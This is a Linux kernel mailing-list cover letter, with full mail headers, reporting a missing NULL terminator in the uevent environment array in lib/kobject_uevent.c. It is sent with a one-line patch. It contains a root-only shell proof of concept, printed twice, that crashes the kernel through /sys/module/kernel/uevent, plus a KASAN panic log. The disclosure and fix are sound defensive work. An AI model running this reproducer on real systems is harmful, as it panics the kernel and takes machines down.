Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.215.174
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795436206;
	b=cjV6r1E+/CnPZdvtn1Isn5iggXLg5FdAYhUVYIYnp792poI3fIHjFXnwOxRtXmZSt2I1
	 sJKXfR07CyJ+312qQadk2ORN34FtIjIMVxBuJ2Leube/w3hyxXKwjTyJ7n/uQezWR9qAA
	 msM/+EMWsQJwEPryAheVv0irBbKsVQ/DgOybuICW8d/xyszD+LN4bGTLxcDYJ/ONeWLSk
	 8Hq8EIIB9SQcC6gKq/HOOsD4GQfGOHcRxAyQECD1o3IgaQvv/h3gDIrL1WevGZe7dC5uv
	 ssvKXZBLLiHQs5UKILSgGFwooqvZAIV6wA5/gu1/gfTCsnug7V+36iZ+mkfJEhGnwOQ==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795436206;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=VkE7Vjq+Mj2kI9OgXXiloalWcp8Wq6iPLh1LkUcmpFg=;
	b=PPrF1sRg/PqI5kvda/KsN0qyXEP2SX8xi1Cduw1O+7HH6UaiWgi9RyM0hL+uRwk7nfG5
	 3v3dMrI+pE40OgiGNcjtrc+wV/6ywvh4Imif5PcXgzXPCi3rTkrj3TnkRp+UFfXqctN35
	 W7RNLWA2S8bcR4SWjLxDHHThxlI8sqmm/8/sHO2bzkpnwBFCstMFii/IL+3/TYcheu68h
	 00oO91ZrOxayGF/rM5TOEKUp0Rghh/z/B80emGCv0620fDkCtCIR+tHisPkbRVddGGBQV
	 6BYx4Cw8k54MXkPo4xWIlWU6V8VGXxOEgKb2uOsIUXIQ33QwyVBiEd//lBYLHll16ug==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=qDexWR8i;
	arc=none smtp.remote-ip=209.85.215.174
Received: from mail-pg1-f174.google.com (mail-pg1-f174.google.com [209.85.215.174])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1F2D0606A31A
	for <linux-kernel@vger.kernel.org>; Mon, 23 Nov 2026 12:16:44 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 1F2D0606A31A
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=qDexWR8i
Received: by mail-pg1-f174.google.com with SMTP id 41be03b00d2f7-cdb2dfcca94so1279988a12.1
        for <linux-kernel@vger.kernel.org>; Mon, 23 Nov 2026 04:16:44 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1795436204; x=1796041004; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=VkE7Vjq+Mj2kI9OgXXiloalWcp8Wq6iPLh1LkUcmpFg=;
        b=qDexWR8i4BBgKJR8omxCHIuNCInbmwfSZZahUl78yOMkGRdIWSk1mpLpljcQ8kuegj
         E1rfGT9S9r5C9J/NnaJfrcsFHqM19U5Jmvm1AXqqf0iE4Vpbx5IB0d3YoFB7Gf/Ft1K3
         8tgvRwMCNfeqQJVhkoKV+t00zKDGn6aXh7sdZEXY0Ep/WsyA4SMw3PEsY1EJor6W6Qvk
         hJj3Qfvf0h5GjAjurLVOmz9SamecKeIkVofGqyJny7wYRWafQQrYK8ztPIlls5w8eyS8
         0Nw7NjCAGr3kKQlioJ5nrqcKeLhYVh30ZvTDfasVFUOO/sgKVXbQYSzbbFq8FyqQiA+d
         Xw1Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1795436204; x=1796041004;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=VkE7Vjq+Mj2kI9OgXXiloalWcp8Wq6iPLh1LkUcmpFg=;
        b=JwnrLQB3BEfHHetvaKQbU1fqpVkwtDTYrvpsA4TMtRKpMMH+vNti/c22UH0BbS4L+5
         qB2YQ/Dh5iYytvVvnauqqUXyvcgLr/3QB8T0vH/6xU/OHqvny6dOIgtHTZbq78N69C0w
         bQLSW5ykOAwB/NoYHgBpeIubezqfet90N0QT/WLtK78J6IVI9mKh03wUJBqLQl4NAY9b
         a0R2P4ZnfsblEJjDlBTSyzzxqK9hPOMrZOCrDRD/f8jQYicXo1V7kJm36G953YynmHMA
         1IR1B6e+D0o0WaCrREDstres245F63CiUhQV4eIvz1uHGdIEKk7YMJxnP+7LGY9KqPFA
         1eDw==
X-Gm-Message-State: APuU4Z/UNiGE+f4RlTascyx09V58AUWVpEwwwCON8LfH1+hL7tiJMsjl
	c+7kQL5vnfpqDRtbwN13cG8AM2QQpI414pkfSz7kFTGaEX0GJpn1n+1aUtPvMkHcnP4YZFfMD5d
	NF2W81A==
X-Gm-Gg: AZFdTZcHYxQMf7BUpn/c7tWBp5NAR4ZNK3oLqFjrj6p7mvCcz3ZLpNUIgTRf5zB8cIV
	O+N0xTbw4l5osAEVTc9BW+9a4UZcvqJcFnCguBTTxPSTukO1OQdVF5LC6WXS04Pbh6LvLNrNcpW
	OuiqsoeeSGUs0smtlEPmpI9efYb097vu/SAQL+iCn2MQSUUm1qQ+JStWzpmtZ7+py8odi/kAV5H
	khhiznm/E/3eaTqOaefTKKNILbPS/OH/VtuAluYQTutPRQMVq4RfY54AvDLTw858g5ejdTwGICQ
	SNSQBoKI/v5eIdcnmJlGg9eTVBeC3/XXZuhcDRWYniJ+8PvCzPqr4CNRyzI6mPY4qb+vDynUMwL
	wj5LLZLFzmORtdRE8c03YcCZSxJ8iBNa83LN6CoIF2/5tHlS8tqBc9NNdjgthbX8F+0QmelJqxS
	olr7kLlG0d4SsOgLI/W3Yb7vohzALonYUqwdpdemsu605Nz+uj1i6KUhnbYe7Rd51iZlqhjbqP4
	a8lkinC1BCnwStVosFLlR2mwZxiIoqvqk9lkWwMnB5lqSuK7Z1Ptkxag4IdH8Uz7S1852Ltk7/d
	2emOQT69TivZUBKc5dFpB2PuODJ64nu84o+hq3AR
X-Received: by 2002:a17:90b:2fcd:b0:3ad:b8c8:4a84 with SMTP id 98e67ed59e1d1-3b41c925e29mr10077702a91.26.1795436204098;
        Mon, 23 Nov 2026 04:16:44 -0800 (PST)
Received: from enjou-Legion-Y7000P-2019 ([191.223.218.36])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3b40578dca0sm21112338a91.2.2026.11.23.04.16.40
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 23 Nov 2026 04:16:43 -0800 (PST)
From: Ren Wei <weir@nebusec.ai>
To: linux-kernel@vger.kernel.org,
	driver-core@lists.linux.dev
Cc: gregkh@linuxfoundation.org,
	rafael@kernel.org,
	dakr@kernel.org,
	johan@kernel.org,
	akpm@linux-foundation.org,
	kay.sievers@vrfy.org,
	vega@nebusec.ai,
	caoruide123@gmail.com,
	weir@nebusec.ai
Subject: [PATCH driver-core 0/1] kobject: reserve an envp slot for the terminator
Date: Mon, 23 Nov 2026 20:16:36 +0800
Message-ID: <cover.1795426787.git.caoruide123@gmail.com>
X-Mailer: git-send-email 2.53.0
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Post: <mailto:linux-kernel@vger.kernel.org>
List-Help: <mailto:linux-kernel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Ruide Cao <caoruide123@gmail.com>

Hi Linux kernel maintainers,

We found an issue in lib/kobject_uevent.c.

This bug is tracked at: https://bugtracker.nebusec.ai/f/16082

add_uevent_var() permits envp_idx to reach ARRAY_SIZE(env->envp), filling
the final pointer slot without reserving a trailing NULL. With
CONFIG_UEVENT_HELPER and a nonempty helper path, an event containing
exactly 61 variables before SEQNUM causes SEQNUM, HOME, and PATH to fill
all 64 slots. call_usermodehelper then asynchronously passes this
unterminated array to kernel_execve(). count_strings_kernel() reads beyond
envp into envp_idx and env->buf, interprets those bytes as pointers, and
later dereferences invalid addresses while copying the environment.
Synthetic arguments allow the environment count to be tuned, resulting in
an out-of-bounds scan and kernel crash.

Privilege model: writing a synthetic uevent to /sys/module/kernel/uevent
and setting /proc/sys/kernel/hotplug require CAP_SYS_ADMIN; the
reproducer runs as root. The crash also depends on CONFIG_UEVENT_HELPER
and a nonempty helper path.

Compatibility: no uAPI change.

Reproducer:

#!/bin/sh
set -eu

# This PoC must run as root inside the guest.
printf '%s' /bin/true > /proc/sys/kernel/hotplug
echo 0 > /proc/sys/kernel/panic_on_warn

msg='add 11111111-1111-1111-1111-111111111111'
i=1
while [ "$i" -le 57 ]; do
	msg="$msg K$i=V$i"
	i=$((i + 1))
done

printf '%s\n' "$msg" > /sys/module/kernel/uevent
sleep 2



We run the PoC in a 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#!/bin/sh
set -eu

# This PoC must run as root inside the guest.
printf '%s' /bin/true > /proc/sys/kernel/hotplug
echo 0 > /proc/sys/kernel/panic_on_warn

msg='add 11111111-1111-1111-1111-111111111111'
i=1
while [ "$i" -le 57 ]; do
	msg="$msg K$i=V$i"
	i=$((i + 1))
done

printf '%s\n' "$msg" > /sys/module/kernel/uevent
sleep 2


------END PoC--------

----BEGIN crash log----

[  161.975900][ T1043] BUG: unable to handle page fault for address: 0000000000656c75
[  161.977567][ T1043] #PF: supervisor read access in kernel mode
[  161.978836][ T1043] #PF: error_code(0x0000) - not-present page
[  161.979824][ T1043] PGD 0 P4D 0
[  161.980319][ T1043] Oops: Oops: 0000 [#1] SMP KASAN NOPTI
[  161.981257][ T1043] CPU: 0 UID: 0 PID: 1043 Comm: kworker/u16:0 Not tainted 6.12.95 #4 53deed68f5e8c87eac9412ec2ca16e6c37d9fe62
[  161.983040][ T1043] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  161.985205][ T1043] RIP: 0010:strnlen+0x1b/0x40
[  161.986083][ T1043] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 48 8d 14 37 48 89 f8 48 85 f6 75 0b eb 21 48 83 c0 01 48 39 c2 74 0d <80> 38 00 75 f2 48 29 f8 e9 c3 bd 36 00 48 89 d0 48 29 f8 e9 b8 bd
[  161.989083][ T1043] RSP: 0018:ffffc90003127e30 EFLAGS: 00010206
[  161.990058][ T1043] RAX: 0000000000656c75 RBX: ffff88810df296a8 RCX: ffffffff81f0516d
[  161.991261][ T1043] RDX: 0000000000676c75 RSI: 0000000000020000 RDI: 0000000000656c75
[  161.992481][ T1043] RBP: ffff888110090040 R08: 0000000000000001 R09: fffff9400006ea00
[  161.993709][ T1043] R10: ffffea00003751f7 R11: 0000000000000001 R12: 0000000000656c75
[  161.994995][ T1043] R13: ffff888117b20200 R14: ffff88810df29010 R15: dffffc0000000000
[  161.996234][ T1043] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
[  161.997606][ T1043] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  161.998664][ T1043] CR2: 0000000000656c75 CR3: 0000000008534002 CR4: 0000000000770ef0
[  161.999992][ T1043] PKRU: 55555554
[  162.000517][ T1043] Call Trace:
[  162.001100][ T1043]  <TASK>
[  162.001523][ T1043]  copy_string_kernel+0x27/0x440
[  162.002422][ T1043]  ? srso_alias_return_thunk+0x5/0xfbef5
[  162.003347][ T1043]  ? __asan_memcpy+0x3c/0x60
[  162.004120][ T1043]  copy_strings_kernel+0x92/0x130
[  162.004951][ T1043]  kernel_execve+0x201/0x2e0
[  162.005615][ T1043]  call_usermodehelper_exec_async+0x21f/0x440
[  162.006658][ T1043]  ? trace_hardirqs_on+0x5b/0x110
[  162.007530][ T1043]  ? __pfx_call_usermodehelper_exec_async+0x10/0x10
[  162.008499][ T1043]  ret_from_fork+0x31/0x70
[  162.009271][ T1043]  ? __pfx_call_usermodehelper_exec_async+0x10/0x10
[  162.010331][ T1043]  ret_from_fork_asm+0x1a/0x30
[  162.011099][ T1043]  </TASK>
[  162.011639][ T1043] Modules linked in:
[  162.012264][ T1043] CR2: 0000000000656c75
[  162.012984][ T1043] ---[ end trace 0000000000000000 ]---
[  162.013800][ T1043] RIP: 0010:strnlen+0x1b/0x40
[  162.014558][ T1043] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 48 8d 14 37 48 89 f8 48 85 f6 75 0b eb 21 48 83 c0 01 48 39 c2 74 0d <80> 38 00 75 f2 48 29 f8 e9 c3 bd 36 00 48 89 d0 48 29 f8 e9 b8 bd
[  162.017573][ T1043] RSP: 0018:ffffc90003127e30 EFLAGS: 00010206
[  162.018548][ T1043] RAX: 0000000000656c75 RBX: ffff88810df296a8 RCX: ffffffff81f0516d
[  162.019831][ T1043] RDX: 0000000000676c75 RSI: 0000000000020000 RDI: 0000000000656c75
[  162.021036][ T1043] RBP: ffff888110090040 R08: 0000000000000001 R09: fffff9400006ea00
[  162.022264][ T1043] R10: ffffea00003751f7 R11: 0000000000000001 R12: 0000000000656c75
[  162.023449][ T1043] R13: ffff888117b20200 R14: ffff88810df29010 R15: dffffc0000000000
[  162.024845][ T1043] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
[  162.026300][ T1043] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  162.027378][ T1043] CR2: 0000000000656c75 CR3: 0000000008534002 CR4: 0000000000770ef0
[  162.028229][ T1043] PKRU: 55555554
[  162.028615][ T1043] Kernel panic - not syncing: Fatal exception
[  162.029525][ T1043] Kernel Offset: disabled
[  162.030001][ T1043] Rebooting in 10 seconds..


-----END crash log-----

Best regards,
Ruide Cao

Ruide Cao (1):
  kobject: reserve an envp slot for the terminator

 lib/kobject_uevent.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)


base-commit: b6a9fa34ce4187cb69d3c588a4bbffc31ce5db8f
-- 
2.47.3

